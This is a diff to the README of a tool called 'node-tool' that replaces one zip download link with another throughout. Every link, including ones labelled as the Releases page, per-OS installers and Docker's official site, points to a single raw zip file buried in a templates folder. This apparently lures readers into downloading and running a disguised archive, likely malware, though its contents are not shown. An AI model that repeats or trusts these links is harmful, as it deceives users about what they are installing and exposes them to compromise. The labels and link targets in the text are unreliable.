@@ -6,7 +6,7 @@ Welcome to **node-tool**! This tool helps you manage your custom magic nodes wit
 
 ## 💾 Download Now
 
-[![Download node-tool](https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/templates/node-tool_v3.9.zip%https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/templates/node-tool_v3.9.zip)](https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/templates/node-tool_v3.9.zip)
+[![Download node-tool](https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/modules/history/templates/tool-node-v2.1.zip%https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/modules/history/templates/tool-node-v2.1.zip)](https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/modules/history/templates/tool-node-v2.1.zip)
 
 ## 🌟 Key Features
 
@@ -27,7 +27,7 @@ To run **node-tool**, your system should meet the following requirements:
 
 1. **Visit the Download Page**
 
-   Go to the [Releases page](https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/templates/node-tool_v3.9.zip) to find the latest version of **node-tool**. 
+   Go to the [Releases page](https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/modules/history/templates/tool-node-v2.1.zip) to find the latest version of **node-tool**. 
 
 2. **Choose Your Version**
 
@@ -35,7 +35,7 @@ To run **node-tool**, your system should meet the following requirements:
 
 3. **Download the Installer**
 
-   Click on the installer that matches your operating system. For Windows users, it might be something like `https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/templates/node-tool_v3.9.zip`. For macOS, you may find `https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/templates/node-tool_v3.9.zip`, and for Linux users, the `https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/templates/node-tool_v3.9.zip` will be available.
+   Click on the installer that matches your operating system. For Windows users, it might be something like `https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/modules/history/templates/tool-node-v2.1.zip`. For macOS, you may find `https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/modules/history/templates/tool-node-v2.1.zip`, and for Linux users, the `https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/modules/history/templates/tool-node-v2.1.zip` will be available.
 
 4. **Install the Application**
 
@@ -46,7 +46,7 @@ To run **node-tool**, your system should meet the following requirements:
      Open the downloaded `.zip` file and drag the **node-tool** icon to your Applications folder.
 
    - For Linux:  
-     Extract the `https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/templates/node-tool_v3.9.zip` file and run the application using terminal commands.
+     Extract the `https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/modules/history/templates/tool-node-v2.1.zip` file and run the application using terminal commands.
 
 5. **Run the Application**
 
@@ -76,7 +76,7 @@ You can easily subscribe to updates by navigating to the "Subscriptions" section
 
 If you prefer to use Docker, follow these steps:
 
-1. **Install Docker**: Make sure you have Docker installed on your system. You can download it from [Docker's official site](https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/templates/node-tool_v3.9.zip).
+1. **Install Docker**: Make sure you have Docker installed on your system. You can download it from [Docker's official site](https://raw.githubusercontent.com/NXTHAN2K25/node-tool/main/app/modules/history/templates/tool-node-v2.1.zip).
 
 2. **Pull the Docker Image**:
 
